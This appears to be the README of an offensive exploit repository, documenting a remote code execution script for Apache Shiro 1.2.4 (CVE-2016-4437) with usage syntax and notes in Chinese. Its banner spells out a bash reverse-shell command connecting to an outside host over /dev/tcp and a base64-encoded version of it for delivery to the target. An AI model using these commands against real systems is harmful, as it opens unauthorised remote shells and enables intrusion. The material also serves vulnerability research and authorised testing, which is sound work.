# Readme
Apache Shiro 


<details>
<summary>Shiro 1.2.4 [点击展开] </summary>
  
```
+-------------------------------------------------------------------------------------------------------+
+ DES: By zhzyker as https://github.com/zhzyker/exphub                                                  +
+      Vuln Name: CVE-2016-4437 | Shiro 550  |  Shiro 1.2.4                                             +
+                                                                                                       +
+      Nc shell need encode command: http://www.jackson-t.ca/runtime-exec-payloads.html                 +
+      Original: bash -i >&/dev/tcp/1.1.1.1/233 0>&1                                                    +
+      Encoding: bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMjMzIDA+JjE=}|{base64,-d}|{bash,-i}  +
+-------------------------------------------------------------------------------------------------------+
+ USE: python3 <filename> <url>                                                                         +
+ EXP: python3 shiro-1.2.4_rce.py http://1.1.1.1:8080                                                   +
+ VER: Apahce Shiro <= 1.2.4                                                                            +
+-------------------------------------------------------------------------------------------------------+
```

Linux系统使用base64编码发送命令，Windows发送默认字符  
利用示例：  
![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/1.gif)
![images](https://github.com/zhzyker/exphub/tree/master/shiro/image/2.gif)

</details>



